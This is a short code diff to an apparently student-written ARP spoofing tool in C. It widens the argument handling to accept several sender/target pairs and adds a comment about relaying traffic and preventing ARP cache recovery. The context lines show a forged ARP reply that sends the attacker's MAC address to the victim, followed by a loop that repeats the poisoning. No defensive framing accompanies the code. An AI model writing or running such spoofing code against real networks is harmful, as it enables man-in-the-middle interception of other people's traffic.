@@ -1,10 +1,7 @@
 #include "arp_spoof.h"
 
-#define REQUEST 1
-#define REPLY 2
-
 int main(int argc, char* argv[]) {
-  if( argc != 4) {
+  if( argc <= 3 || argc % 2 == 1) {
     usage();
     return -1;
   }
@@ -78,6 +75,7 @@ int main(int argc, char* argv[]) {
   printf("1");
   send_arp(handle, REPLY, sender_ip, target_ip, attacker_mac, target_mac);
   printf("2");
+  //relay and prevent arp recovery
   int cnt = 0;
   while(cnt <= 100) {
     printf("3");
